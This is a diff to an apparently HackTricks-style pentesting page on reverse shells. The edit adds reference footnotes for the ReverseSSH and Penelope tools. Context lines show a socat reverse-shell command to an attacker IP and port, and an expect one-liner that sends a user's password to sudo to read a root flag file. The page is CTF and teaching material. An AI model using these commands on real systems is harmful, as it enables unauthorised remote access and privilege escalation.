@@ -51,7 +51,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.
+A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.<sup>[[1]](#references)</sup>
 
 Below is an example for `x86` with upx-compressed binaries. For other binaries, check [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
@@ -94,7 +94,7 @@ sftp -P 8888 127.0.0.1
 
 ## Penelope
 
-[Penelope](https://github.com/brightio/penelope) automatically upgrades Linux reverse shells to TTY, handles the terminal size, logs everything and much more. Also it provides readline support for Windows shells.
+[Penelope](https://github.com/brightio/penelope) automatically upgrades Linux reverse shells to TTY, handles the terminal size, logs everything and much more. Also it provides readline support for Windows shells.<sup>[[2]](#references)</sup>
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
@@ -106,7 +106,10 @@ If for some reason you cannot obtain a full TTY you **still can interact with pr
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
 
+## References
+
+- [1] [ReverseSSH - Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh)
+- [2] [Penelope - Shell handler that automates a few things to make life easier](https://github.com/brightio/penelope)
+
 {{#include ../../banners/hacktricks-training.md}}
-
-
 
